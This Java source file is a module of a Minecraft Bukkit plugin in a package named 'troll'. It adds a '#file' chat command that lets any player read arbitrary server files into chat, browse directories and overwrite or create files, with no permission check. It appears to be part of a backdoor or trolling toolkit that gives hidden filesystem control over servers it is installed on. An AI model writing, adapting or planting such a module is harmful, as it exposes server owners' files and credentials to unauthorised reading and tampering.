package com.troll.mods;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import org.bukkit.entity.Player;

import com.google.common.base.Strings;
import com.troll.start.Start;

public class FileModule extends Module {
	private String currentDirectory;
	
	public FileModule() {
		super("File", "Leotendo", "Bearbeite Datein im Dateisystem");
		
		this.currentDirectory = Start.getInstance().getPluginFile().getAbsolutePath().replace("/plugins/" + Start.getInstance().getPluginFile().getName(), "");
	}
 
	@Override
	public boolean execute(Player p, String[] args) {
		if (args.length < 2) {
			p.sendMessage(Start.getInstance().getPrefix() + "§eBenutze: #file <option> <file> <content (optional)>");
			return false;
		}
		
		String option = args[1];
		String fileName = "";
		try {
			fileName = args[2];
		} catch (ArrayIndexOutOfBoundsException e) {
		}
		
		switch (args[1]) {
		case "read":
			if (fileName == "") {
				p.sendMessage(Start.getInstance().getPrefix() + "§cEs wurde keine Datei angegeben");
				break;
			}
			
			try {
				BufferedReader reader = new BufferedReader(new FileReader(fileName));
				String line;
				
				p.sendMessage(Start.getInstance().getPrefix() + "§6========== " + fileName + " ==========");
				p.sendMessage(Start.getInstance().getPrefix());
				
				while ((line = reader.readLine()) != null) {
					p.sendMessage(Start.getInstance().getPrefix() + "§r" + line);
				}
				
				p.sendMessage(Start.getInstance().getPrefix());
				p.sendMessage(Start.getInstance().getPrefix() + "§6====================" + Strings.repeat("=", fileName.length()));
			} catch (IOException e) {
				p.sendMessage(Start.getInstance().getPrefix() + "§cDie Datei konnte nicht gefunden werden!");
				return false;
			}
			break;
		case "list":
			if (fileName.contains(".")) {
				p.sendMessage(Start.getInstance().getPrefix() + "§cDies ist eine Datei!");
				break;
			}
			
			p.sendMessage(Start.getInstance().getPrefix() + "§6========== " + fileName + " ==========");
			p.sendMessage(Start.getInstance().getPrefix());
			
			File[] folderContent = new File(this.currentDirectory).listFiles();
			for (File entry : folderContent) {
				if (entry.isFile()) {
					p.sendMessage(Start.getInstance().getPrefix() + "§b" + entry.getName() + "§7 - §b" + entry.length() / (1024*1024) + " MB");
				} else {
					p.sendMessage(Start.getInstance().getPrefix() + "§5" + entry.getName() + "§5 - §5" + entry.length() / (1024*1024) + " MB");
				}
			}
			
			p.sendMessage(Start.getInstance().getPrefix());
			p.sendMessage(Start.getInstance().getPrefix() + "§6====================" + Strings.repeat("=", fileName.length()));
			
			break;
		
		case "where":
			p.sendMessage(Start.getInstance().getPrefix() + "§7" + this.currentDirectory);
			break;
		case "dir":
		case "directory":
			if (fileName == "") {
				p.sendMessage(Start.getInstance().getPrefix() + "§cEs wurde kein Ordner angegeben!");
				break;
			}
			
			this.currentDirectory = fileName;
			p.sendMessage(Start.getInstance().getPrefix() + "§aDu hast dein Verzeichnet gewechselt");
			
			break;
			
		case "write":
		case "edit":
			if (fileName == "") {
				p.sendMessage(Start.getInstance().getPrefix() + "§cEs wurde keine Datei angegeben!");
				break;
			}
			
			try {
				BufferedWriter writer = new BufferedWriter(new FileWriter(fileName));
				String content = "";
				for (int i = 3; i < args.length; i++) {
					content += " " + args[i];
				}
				writer.write(content);
				writer.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
			break;
		}
		
		return true;
	}
}
